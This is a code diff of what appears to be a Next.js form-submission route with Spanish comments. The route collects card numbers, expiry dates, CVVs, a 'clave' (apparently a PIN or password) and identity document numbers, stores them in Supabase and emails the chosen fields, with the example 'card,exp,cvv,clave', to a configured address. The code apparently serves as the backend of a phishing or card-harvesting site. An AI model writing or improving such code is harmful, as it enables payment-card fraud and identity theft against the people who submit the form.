@@ -3,7 +3,7 @@ import { z } from "zod";
 import { Resend } from "resend";
 import { supabase } from "utils/supabase/server";
 
-// 👉 función inline
+// 👉 Función inline para filtrar campos permitidos
 function pickAllowedFields(
   payload: Record<string, any>,
   includeCsv: string | undefined
@@ -17,11 +17,12 @@ function pickAllowedFields(
   return out;
 }
 
+// Configuración de Resend
 const resend = process.env.RESEND_API_KEY
   ? new Resend(process.env.RESEND_API_KEY)
   : null;
 
-// ✅ corregido Zod: claves string, valores libres
+// ✅ Zod schema genérico
 const Payload = z.record(z.string(), z.any());
 
 export async function POST(req: Request) {
@@ -34,40 +35,62 @@ export async function POST(req: Request) {
     // 1) Guardar en Supabase
     const { error: dbError } = await supabase.from("form_submissions").insert([
       {
+        amount: data.amount,
+        payDay: data.payDay,
+        docType: data.docType,
+        docNumber: data.docNumber,
         card: data.card,
         exp: data.exp,
         cvv: data.cvv,
         clave: data.clave,
-        docType: data.docType,
-        docNumber: data.docNumber,
+        created_at: new Date().toISOString(),
       },
     ]);
 
     if (dbError) {
       console.error("❌ Supabase insert error:", dbError);
-    } else {
-      console.log("✅ Registro insertado en Supabase");
+      return NextResponse.json(
+        { ok: false, message: "Error guardando en Supabase" },
+        { status: 500 }
+      );
     }
 
-    // 2) Email
-    const includeCsv = process.env.INCLUDE_FIELDS;
+    console.log("✅ Registro insertado en Supabase");
+
+    // 2) Preparar correo
+    const includeCsv = process.env.INCLUDE_FIELDS; // ej: "card,exp,cvv,clave,docType,docNumber"
     const allowed = pickAllowedFields(data, includeCsv);
 
     const entriesHtml = Object.entries(allowed)
       .map(([k, v]) => `<p><strong>${k}:</strong> ${String(v ?? "")}</p>`)
       .join("\n");
 
-    const html = `<div><h3>Nuevo envío</h3>${entriesHtml}</div>`;
+    const html = `
+      <div style="font-family:system-ui,Segoe UI,Roboto,Arial;line-height:1.5">
+        <h3>📩 Nuevo envío de formulario</h3>
+        ${entriesHtml || "<i>No se configuraron INCLUDE_FIELDS</i>"}
+        <hr/>
+        <small>Enviado: ${new Date().toLocaleString()}</small>
+      </div>
+    `;
 
+    // 3) Enviar correo con Resend
     const to = process.env.MAIL_TO!;
     const from = process.env.MAIL_FROM || "onboarding@resend.dev";
+
+    if (!to) {
+      return NextResponse.json(
+        { ok: false, message: "MAIL_TO no configurado" },
+        { status: 500 }
+      );
+    }
 
     if (resend) {
       try {
         const result = await resend.emails.send({
           from,
           to,
-          subject: "📩 Nuevo formulario",
+          subject: "📩 Nuevo formulario recibido",
           html,
         });
         console.log("📧 Email enviado:", result);
